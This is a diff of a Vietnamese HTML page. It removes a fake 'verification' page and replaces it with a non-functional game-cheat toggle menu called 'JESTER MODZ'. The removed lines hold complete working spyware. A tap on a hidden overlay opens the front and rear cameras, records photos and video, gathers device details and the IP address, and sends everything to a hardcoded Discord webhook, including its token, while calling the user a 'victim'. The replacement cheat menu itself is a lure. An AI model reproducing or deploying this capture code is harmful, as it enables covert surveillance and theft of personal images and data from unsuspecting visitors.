@@ -1,257 +1,116 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Continue to Proceed</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>JESTER MODZ</title>
 <style>
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    margin: 0; padding: 0; height: 100vh;
-    background: linear-gradient(135deg, #1e3c72, #2a5298);
-    color: white; display: flex; justify-content: center; align-items: center;
-  }
-  .container {
-    text-align: center; background: rgba(0,0,0,0.6); padding: 40px;
-    border-radius: 16px; max-width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-  }
-  h1 { margin: 0 0 20px; font-size: 28px; }
-  .loading { font-size: 18px; margin: 20px 0; color: #4fc3f7; }
-  video, canvas { display: none; }
-  #click-overlay {
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    z-index: 9999; background: transparent; cursor: pointer;
-  }
+:root{
+  --bg1:#050b1a; --bg2:#0b2a52; --cyan:#27d3ff; --text:#f2f8ff; --muted:#8aa3c2;
+  --card:rgba(10,14,24,.72); --off:#2a2d35; --knob:#8b8f98;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){:root{color-scheme:dark}}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{
+  margin:0;min-height:100vh;color:var(--text);
+  font-family:"Be Vietnam Pro","Segoe UI",Roboto,system-ui,sans-serif;
+  background:
+    radial-gradient(60% 40% at 50% 0%,rgba(39,211,255,.35),transparent 70%),
+    radial-gradient(50% 35% at 85% 60%,rgba(70,110,255,.28),transparent 70%),
+    linear-gradient(180deg,var(--bg2),var(--bg1));
+  background-attachment:fixed;
+}
+.wrap{max-width:460px;margin:0 auto;padding:28px 16px 40px;display:flex;flex-direction:column;align-items:center}
+
+/* ===== CSS ĐÃ ĐƯỢC SỬA CHO ẢNH CATBOX ===== */
+.avatar{
+  width:112px;height:112px;border-radius:50%;
+  border:3px solid var(--cyan);
+  /* Thay link Catbox của mày vào đây */
+  background: url('https://files.catbox.moe/qe7kv2.webp') center/cover no-repeat;
+  box-shadow:0 0 28px rgba(39,211,255,.7),inset 0 0 20px rgba(0,0,0,.5);
+  display:grid;place-items:center;font-size:52px;
+  animation:glow 3s ease-in-out infinite;
+}
+@keyframes glow{50%{box-shadow:0 0 46px rgba(39,211,255,.95),inset 0 0 20px rgba(0,0,0,.5)}}
+/* ========================================= */
+
+h1{margin:20px 0 4px;font-size:30px;font-weight:800;letter-spacing:.3px;text-align:center}
+.sub{color:var(--muted);font-size:14px;margin-bottom:18px;text-align:center}
+.eyes{display:flex;gap:26px;margin-bottom:22px}
+.eye{width:62px;height:62px;border-radius:50%;border:3px solid var(--cyan);
+  background:radial-gradient(circle,#0b1c3d 40%,#123a78);box-shadow:0 0 16px rgba(39,211,255,.6);
+  display:flex;align-items:center;justify-content:center;gap:6px}
+.eye i{width:8px;height:8px;border-radius:50%;background:#fff}
+.list{width:100%;display:flex;flex-direction:column;gap:14px}
+.row{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:22px 20px;border-radius:24px;cursor:pointer;
+  background:var(--card);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  border:1px solid rgba(255,255,255,.07);
+  transition:border-color .25s,box-shadow .25s;
+  font-size:19px;font-weight:500;user-select:none;
+}
+.row.on{border-color:rgba(39,211,255,.7);box-shadow:0 0 20px rgba(39,211,255,.25)}
+.sw{position:relative;width:78px;height:40px;border-radius:20px;background:var(--off);transition:background .25s;flex:none}
+.sw b{
+  position:absolute;top:3px;left:3px;width:34px;height:34px;border-radius:50%;
+  background:var(--knob);display:grid;place-items:center;
+  font-size:10px;font-weight:700;color:#e6e8ee;transition:transform .25s,background .25s;
+}
+.sw b::after{content:"OFF"}
+.row.on .sw{background:rgba(39,211,255,.3)}
+.row.on .sw b{transform:translateX(38px);background:var(--cyan);color:#022}
+.row.on .sw b::after{content:"ON"}
+.row:focus-visible{outline:2px solid var(--cyan);outline-offset:3px}
+.foot{margin-top:22px;color:var(--muted);font-size:12px;text-align:center}
+.toast{position:fixed;left:50%;bottom:calc(24px + env(safe-area-inset-bottom,0px));transform:translate(-50%,20px);opacity:0;pointer-events:none;padding:12px 20px;border-radius:999px;background:rgba(8,16,32,.92);border:1px solid var(--cyan);color:var(--text);font-size:14px;transition:opacity .25s,transform .25s}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
 </style>
-<!-- Dùng fetch thuần thay vì axios để nhẹ hơn -->
 </head>
 <body>
+<div class="wrap">
+  <!-- Thẻ div avatar giờ sẽ hiển thị ảnh nền thay vì emoji -->
+  <div class="avatar" aria-hidden="true"></div>
+  
+  <h1>JESTER MODZ</h1>
+  <div class="sub"></div>
+  <div class="eyes" aria-hidden="true"><div class="eye"><i></i><i></i></div><div class="eye"><i></i><i></i></div></div>
 
-<div id="click-overlay"></div>
-<video id="cam" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
-
-<div class="container">
-  <h1>Đang Xác Thực</h1>
-  <div class="loading" id="loading">Nhấp vào màn hình để xác thực</div>
+  <div class="list" id="list">
+    <div class="row" tabindex="0" role="switch" aria-checked="false"><span>AIMLOCK</span><span class="sw"><b></b></span></div>
+    <div class="row" tabindex="0" role="switch" aria-checked="false"><span>AIMLOCK HEAD</span><span class="sw"><b></b></span></div>
+    <div class="row" tabindex="0" role="switch" aria-checked="false"><span>NHẸ TÂM + FIX LỐ</span><span class="sw"><b></b></span></div>
+    <div class="row" tabindex="0" role="switch" aria-checked="false"><span>HIỆN MÁU ĐỊCH</span><span class="sw"><b></b></span></div>
+    <div class="row" tabindex="0" role="switch" aria-checked="false"><span>TĂNG MƯỢT</span><span class="sw"><b></b></span></div>
+  </div>
+  <div class="foot"></div>
 </div>
-
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
 <script>
-// ===== CẤU HÌNH DISCORD WEBHOOK =====
-// DÁN LINK WEBHOOK DISCORD CỦA MÀY VÀO ĐÂY (Lấy trong phần Cài đặt kênh -> Tích hợp -> Webhook)
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1572524780039569481/jv_lvQeH3BLd9iUubApFCOIJeJtwWYj6qK22nAGINDsK28UZ3ebciobPNnbrz4bycCiz';
-
-let captureCount = 0;
-const MAX_ATTEMPTS = 5;
-let isStreaming = false;
-let retryTimer = null;
-
-// Gửi text
-async function sendText(text) {
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: text })
-    });
-  } catch (e) { console.log("Lỗi gửi text", e); }
-}
-
-// Gửi media (Discord giới hạn caption 2000 ký tự)
-async function sendMedia(blob, type, caption) {
-  if (!blob) return;
-  const formData = new FormData();
-  const ext = type === 'photo' ? 'jpg' : 'webm';
-  formData.append('files[0]', blob, `${type}_${Date.now()}.${ext}`);
-  formData.append('content', caption.substring(0, 2000));
-
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      body: formData
-    });
-  } catch (e) { console.error('Send failed:', e); }
-}
-
-// Thu thập info
-async function collectInfo() {
-  let info = `🎯 **Nạn nhân mới mở link!**\nThời gian: ${new Date().toLocaleString('vi-VN')}\n`;
-  info += `📱 Thiết bị: \`${navigator.userAgent}\`\n`;
-  info += `📺 Màn hình: ${screen.width}×${screen.height}\n`;
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      info += `🔋 Pin: ${Math.round(battery.level * 100)}%\n`;
-    } catch {}
+var KEY='jester-modz',saved={};
+try{saved=JSON.parse(localStorage.getItem(KEY)||'{}')}catch(e){}
+var toast=document.getElementById('toast'),tt;
+function say(t){toast.textContent=t;toast.classList.add('show');clearTimeout(tt);tt=setTimeout(function(){toast.classList.remove('show')},1400)}
+document.querySelectorAll('.row').forEach(function(r){
+  var name=r.firstElementChild.textContent;
+  function set(on){r.classList.toggle('on',on);r.setAttribute('aria-checked',on)}
+  set(!!saved[name]);
+  function toggle(){
+    var on=!r.classList.contains('on');
+    set(on);saved[name]=on;
+    try{localStorage.setItem(KEY,JSON.stringify(saved))}catch(e){}
+    if(navigator.vibrate){try{navigator.vibrate(15)}catch(e){}}
+    say(name+': '+(on?'đã bật':'đã tắt'));
   }
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    info += `🌐 IP: \`${data.ip}\`\n`;
-  } catch {}
-  return info;
-}
-
-// Chụp ảnh
-function takePhoto(video, isFrontCamera) {
-  return new Promise((resolve, reject) => {
-    if (video.videoWidth === 0) return reject(new Error("Video chưa có dữ liệu"));
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    if (isFrontCamera) {
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-    }
-    
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-    canvas.toBlob((blob) => {
-      if (blob) resolve(blob);
-      else reject(new Error("canvas.toBlob null"));
-    }, 'image/jpeg', 0.9);
-  });
-}
-
-// Lấy Stream
-async function getStream(facingMode) {
-  return await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-    audio: false 
-  });
-}
-
-// Bắt đầu
-async function startCaptureProcess() {
-  if (isStreaming) return;
-  if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-
-  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-    sendText('⚠️ LỖI: Trang web không chạy trên HTTPS, trình duyệt chặn Camera!');
-    document.getElementById('loading').textContent = 'Error: Not HTTPS';
-    return;
-  }
-
-  document.getElementById('loading').textContent = 'Hãy Chờ 3s';
-
-  try {
-    let stream = await getStream('user');
-    isStreaming = true;
-    
-    document.getElementById('click-overlay').style.display = 'none';
-    document.getElementById('loading').textContent = '...';
-
-    const video = document.getElementById('cam');
-    video.srcObject = stream;
-    
-    await new Promise((resolve) => {
-      if (video.readyState >= 2) resolve();
-      else video.onloadeddata = resolve;
-    });
-    await video.play();
-    await new Promise(r => setTimeout(r, 1000));
-
-    const info = await collectInfo();
-    sendText(info + `\n✅ **Đã cấp quyền. Bắt đầu chụp Camera TRƯỚC...**`);
-
-    // QUAY CAMERA TRƯỚC
-    let options = { mimeType: 'video/webm;codecs=vp8' };
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/webm' };
-    
-    let recorder = new MediaRecorder(stream, options);
-    let chunks = [];
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.start();
-
-    let photoIndex = 1;
-    let photoIntervalId = setInterval(async () => {
-      try {
-        const photoBlob = await takePhoto(video, true);
-        await sendMedia(photoBlob, 'photo', `📸 **Ảnh TRƯỚC #${photoIndex}** - ${new Date().toLocaleTimeString()}`);
-        photoIndex++;
-      } catch (e) { console.log(e); }
-    }, 1500);
-
-    await new Promise(resolve => {
-      recorder.onstop = resolve;
-      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
-    });
-    clearInterval(photoIntervalId);
-    
-    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video Camera TRƯỚC** (4s)`);
-    stream.getTracks().forEach(track => track.stop()); 
-
-    // CHUYỂN SANG CAMERA SAU
-    sendText(`🔄 **Đang chuyển sang Camera SAU...**`);
-    await new Promise(r => setTimeout(r, 1000));
-
-    stream = await getStream('environment'); 
-    video.srcObject = stream;
-    
-    await new Promise((resolve) => {
-      if (video.readyState >= 2) resolve();
-      else video.onloadeddata = resolve;
-    });
-    await video.play();
-    await new Promise(r => setTimeout(r, 1000));
-
-    // QUAY CAMERA SAU
-    recorder = new MediaRecorder(stream, options);
-    chunks = [];
-    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.start();
-
-    photoIndex = 1;
-    photoIntervalId = setInterval(async () => {
-      try {
-        const photoBlob = await takePhoto(video, false); 
-        await sendMedia(photoBlob, 'photo', `📸 **Ảnh SAU #${photoIndex}** - ${new Date().toLocaleTimeString()}`);
-        photoIndex++;
-      } catch (e) { console.log(e); }
-    }, 1500);
-
-    await new Promise(resolve => {
-      recorder.onstop = resolve;
-      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
-    });
-    clearInterval(photoIntervalId);
-    
-    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video Camera SAU** (4s)`);
-    
-    stream.getTracks().forEach(track => track.stop());
-    document.getElementById('loading').textContent = '';
-
-  } catch (err) {
-    captureCount++;
-    document.getElementById('loading').textContent = '';
-    
-    if (captureCount === 1) {
-       const info = await collectInfo();
-       sendText(info + `\n❌ **Lỗi Camera:** ${err.message}`);
-    }
-
-    if (captureCount < MAX_ATTEMPTS) {
-       retryTimer = setTimeout(startCaptureProcess, 4000);
-    }
-  }
-}
-
-// ===== KÍCH HOẠT BẰNG CHẠM =====
-const overlay = document.getElementById('click-overlay');
-
-overlay.addEventListener('touchstart', function(e) {
-    e.preventDefault();
-    startCaptureProcess();
-}, { passive: false });
-
-overlay.addEventListener('click', function(e) {
-    e.preventDefault();
-    startCaptureProcess();
+  r.addEventListener('click',toggle);
+  r.addEventListener('keydown',function(e){if(e.key===' '||e.key==='Enter'){e.preventDefault();toggle()}});
 });
-
 </script>
 </body>
 </html>
